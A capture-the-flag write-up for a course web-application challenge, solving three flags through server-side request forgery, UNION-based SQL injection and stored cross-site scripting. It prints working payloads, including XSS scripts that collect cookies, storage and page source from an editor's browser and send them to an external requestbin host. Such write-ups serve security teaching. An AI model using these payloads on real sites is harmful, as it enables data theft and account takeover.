# BSK* CTF \#1 - Web apps
Collect 3 flags at http://web.kazet.cc:31339/. <br/> <br/>
# Flag \#1 - FLAG{0c55606a072a912d264846cd22c95020e781}
## Vulnerability
Server-side request forgery ([SSRF](https://portswigger.net/web-security/ssrf))

## Approach
After examining the sources of the main page we can see that there is a `.js` script embedded in the HTML source page. The script calls `/time` API endpoint of the application.

So let's try calling the endpoint ourselves using `curl`:
```
$ curl -XPOST -H "Content-type: application/json" -d '{"timezone": "warsaw"}' 'web.kazet.cc:31339/time'

{"info":"17:13:38","status":"ok"}
```

We succesfully reached the endpoint and received the information about the time in Warsaw. Let's try to break something with the following payload:
```
$ curl -XPOST -H "Content-type: application/json" -d '{"timezone": "foo"}'
 'web.kazet.cc:31339/time'

{"info":"nie uda\u0142o si\u0119 pobra\u0107 http://foo.timezone.internal","status":"error"}
```

So we see that after us calling `/time` endpoint, application tried to reach some internal API located at `<input>.timezone.internal`. Let's try to access local server of the application:

```
$ curl -XPOST -H "Content-type: application/json" -d '{"timezone": "localhost:80/#"}' 'web.kazet.cc:31339/time'

{"info":"FLAG{0c55606a072a912d264846cd22c95020e781}","status":"ok"}
```
And we got the flag.

# Flag \#2 - FLAG{this_is_a_long_and_interesting_flag_9393265140f32ff7fc9f3b5bc9c065b3e6fdc4f4}

## Vulnerability
[SQL injection](https://portswigger.net/web-security/sql-injection)
## Approach
Let's look at `http://web.kazet.cc:31339/stats/<something>` endpoint. After trying to break some things we can see that this enpoint is vulnerable to sql injection. The `<something>` part of URL is a part of some SQL query. <br/> <br/>
Now we can investigate further:
1. Determine the types of the columns:
   * [http://web.kazet.cc:31339/stats/2022 AND 1 = 2 UNION SELECT 'foo', 1--](<http://web.kazet.cc:31339/stats/2022 AND 1 = 2 UNION SELECT 'foo', 1-->)
   * string and number
2. Determine the database vendor
   * After trying different syntaxes with a trial and error method we can say that it is most likely PSQL database.
3. Search for interesting tables (for example using tedious filtering)
   * [http://web.kazet.cc:31339/stats/2022 AND 1=2 UNION SELECT table_name, 1 FROM information_schema.columns where table_name not in ('domain_constraints', 'domain_udt_usage', 'table_constraints', 'role_column_grants', 'sql_sizing', 'user_defined_types', 'view_routine_usage', 'key_column_usage', 'column_column_usage', 'routine_sequence_usage', 'foreign_tables', 'element_types', 'applicable_roles', 'view_column_usage') and table_name not like 'pg%'--](<http://web.kazet.cc:31339/stats/2022 AND 1=2 UNION SELECT table_name, 1 FROM information_schema.columns where table_name not in ('domain_constraints', 'domain_udt_usage', 'table_constraints', 'role_column_grants', 'sql_sizing', 'user_defined_types', 'view_routine_usage', 'key_column_usage', 'column_column_usage', 'routine_sequence_usage', 'foreign_tables', 'element_types', 'applicable_roles', 'view_column_usage') and table_name not like 'pg%'-->)
   * Output: `table_name = interesting_and_secret_information`
4. Find some interesting column
   * [http://web.kazet.cc:31339/stats/2022 AND 1=2 UNION SELECT column_name, 1 from information_schema.columns where table_name = 'interesting_and_secret_information'--](<http://web.kazet.cc:31339/stats/2022 AND 1=2 UNION SELECT column_name, 1 from information_schema.columns where table_name = 'interesting_and_secret_information'-->)
   * Output: `column_name = secret_text_for_example_a_flag`
5. Find the flag (or rather the part of it :)
   * [http://web.kazet.cc:31339/stats/2022 AND 1=2 UNION SELECT secret_text_for_example_a_flag, 1 FROM interesting_and_secret_information--](<http://web.kazet.cc:31339/stats/2022 AND 1=2 UNION SELECT secret_text_for_example_a_flag, 1 FROM interesting_and_secret_information-->)
   * Output: `FLAG{this_is_a_long_and_interesting_flag_9393265140f32ff7...`
6. Find the remaining part of the flag
   * [http://web.kazet.cc:31339/stats/2022 AND 1=2 UNION SELECT SUBSTRING(secret_text_for_example_a_flag, 58, 100), 1 FROM interesting_and_secret_information--](<http://web.kazet.cc:31339/stats/2022 AND 1=2 UNION SELECT SUBSTRING(secret_text_for_example_a_flag, 58, 100), 1 FROM interesting_and_secret_information-->)
   * Output: `fc9f3b5bc9c065b3e6fdc4f4}`

# Flag \#3 - FLAG{752e8db03d875cfec6bdf8305756f1bb}
## Vulnerability
Cross-site scripting ([XSS](https://portswigger.net/web-security/cross-site-scripting)). In this specific case it's JS injection.

## Approach
After logging in the application we are able to create and send an article - http://web.kazet.cc:31339/send_article. We can see that after sending the article, the content is being sent to the editor for the review. It may be an opportuninty to attack the editor (who probably has more priviliges than us). We are going to send some malicious JS script which will be injected into editor's HTML and then executed on his side.<br/> <br/>
But we need to somehow follow the results of the code that is executed by editor. Let's create a simple [requestbin](https://requestbin.com/) container where "editor" will be sending the results to. In my case the requestbin can be accessed at https://eozy3pwhxz589s.m.pipedream.net. <br/><br/>
The blueprint of our malicious script will look like this:
```
<script>
    // Do something as editor
    /* ... */

    // Store the results
    const data = { content: "Hello it's editor!!!" }; 

    // Send the results to our requestbin
    fetch('https://eozy3pwhxz589s.m.pipedream.net', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    });
</script>
```

So let's try pasting this code into the rich-editor and then sending our "article". Nothing happened... Let's copy our request as `curl` using browser's devtools. What we get (data decoded):
```
curl 'http://web.kazet.cc:31339/send_article' \
  -H <some boring headers...>
  .
  .
  .
  --data-raw '<p>&lt;script&gt;</p><p>&nbsp;+&nbsp;+//+Do+something+as+editor</p><p>&nbsp;+&nbsp;+/*+...+*/</p><p><br>&nbsp;</p><p>&nbsp;+&nbsp;+//+Store+the+results</p><p>&nbsp;+&nbsp;+const+data+=+{+content:+"Hello+it's+editor!!!"+};</p><p><br>&nbsp;</p><p>&nbsp;+&nbsp;+//+Send+the+results+to+our+requestbin</p><p>&nbsp;+&nbsp;+fetch('https://eozy3pwhxz589s.m.pipedream.net',+{</p><p>&nbsp;+&nbsp;+&nbsp;+&nbsp;+method:+'POST',</p><p>&nbsp;+&nbsp;+&nbsp;+&nbsp;+headers:+{</p><p>&nbsp;+&nbsp;+&nbsp;+&nbsp;+&nbsp;+&nbsp;+'Content-Type':+'application/json',</p><p>&nbsp;+&nbsp;+&nbsp;+&nbsp;+},</p><p>&nbsp;+&nbsp;+&nbsp;+&nbsp;+body:+JSON.stringify(data),</p><p>&nbsp;+&nbsp;+});</p><p>&lt;/script&gt;</p>' \
  --compressed \
  --insecure
```

So `<script>` is being translated to `&lt;script&gt;`. No worries, let's just reach this endpoint directly from terminal using `curl`. This way we won't let any client-side precautions get in our way. Simply encode the content and provide it as an argument to `--data-raw` curl argument.  
And now it works! We received hello from editor.

Let's retrieve some data that may interest us with a following script:
```
<script>
    // Retrieve cookies, storage, location and HTML source
    const data = {
        cookies: document.cookie,
        lStorage: window.localStorage,
        sStorage: window.sessionStorage,
        location: window.location,
        source: document.documentElement.innerHTML
    }; 

    // Send the results to our requestbin
    fetch('https://eozy3pwhxz589s.m.pipedream.net', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    });
</script>
```

No luck in retrieving session cookie. `cookies`, `lStorage` and `sStorage` are empty. The session cookie must be set using `HttpOnly` flag, so it's not accessible from JS.  

But we found 2 interesting things in `location` and `source` fields.
* at the time of executing JS, the `href` field is set to: `http://zad38-2022-final:5000/show_article/<article_id>`. Since we now know the name of the host, we can call server's endpoints as editor without worrying about breaking [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS/Errors/CORSMissingAllowOrigin) policy.
* In the HTML source, we can see that there is one additional endpoint accessible for the editor - `/send_feedback`.
  
Let's check what editor sees after accessing this endpoint with Http `GET` method:
```
<script>
    // Send the request to GET send_feedback on editor's behalf
    let req = new XMLHttpRequest();
    req.open("GET", "http://zad38-2022-final:5000/send_feedback");
    req.send();

    // Wait 1 second so the response arrives
    setTimeout(() => {

        // Send the response from the server (+ headers)
        const data = { 
            content: req.response,
            resp_headers: req.getAllResponseHeaders(), 
        };

        fetch('https://eozy3pwhxz589s.m.pipedream.net', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        });

    }, "1000");
</script>
```

We successfully received the HTML source. In the source we can find an HTML form:
```
<form method="POST">
  <div class="form-group">
    <label for="receiver">Login odbiorcy</label>
    <input type="text" class="form-control" id="receiver" name="receiver" placeholder="Username">
  </div>
  <div class="form-group">
    <label for="content">Treść</label>
    <textarea class="form-control" id="content" name="content" rows="3"></textarea>
  </div>
  <div class="form-check">
    <input type="checkbox" class="form-check-input" id="debug" name="debug">
    <label class="form-check-label" for="debug">Dołącz informacje diagnostyczne na temat systemu (testowa funkcjonalność)</label>
  </div>
  <div class="form-group">
      <button class="btn btn-primary" type="submit">Wyślij</button>
  </div>
</form>
```

Editor can send the feedback about the article to the user. Let's try sending the feedback to ourselves (in my case, login is `kokokoko`).

```
<script>

    let req = new XMLHttpRequest();
    req.open("POST", "http://zad38-2022-final:5000/send_feedback");
    // "Populate" the form
    req.send("receiver=kokokoko&content=abc&debug=on");

    setTimeout(() => {

        const data = { 
            content: req.response, 
            resp_headers: req.getAllResponseHeaders(), 
            location: document.location 
        };

        fetch('https://eozy3pwhxz589s.m.pipedream.net', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        });

    }, "1000");

</script>
```
And... nothing happens. The only thing that changed is editor receiving info about delivering the feedback:
```
<div class="alert alert-primary" role="alert">Wysłano informację zwrotną</div>
```
But our user doesn't receive any feedback. I've been stuck here for a couple of hours, trying to find the feedback in the database (using SQL injection vulnerability) or other weird places.      
  
Finally, I've found the solution. We are missing the `Content-Type` header in our request. This header is automagically set with a corresponding value by browser when hitting `SUBMIT` in the form. So here is the final version of the malicious script.

```
<script>

    let req = new XMLHttpRequest();
    req.open("POST", "http://zad38-2022-final:5000/send_feedback");
    // Add missing header
    req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    // "Populate" the form
    req.send("receiver=kokokoko&content=abc&debug=on");

    setTimeout(() => {

        const data = { 
            content: req.response, 
            resp_headers: req.getAllResponseHeaders(), 
            location: document.location 
        };

        fetch('https://eozy3pwhxz589s.m.pipedream.net', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        });

    }, "1000");

</script>
```
After refreshing the page on our side (while being logged-in), we can find the flag:
```
<div class="alert alert-primary" role="alert">
    Informacja zwrotna: abc<br>
    flaga: FLAG{752e8db03d875cfec6bdf8305756f1bb}
</div>
```

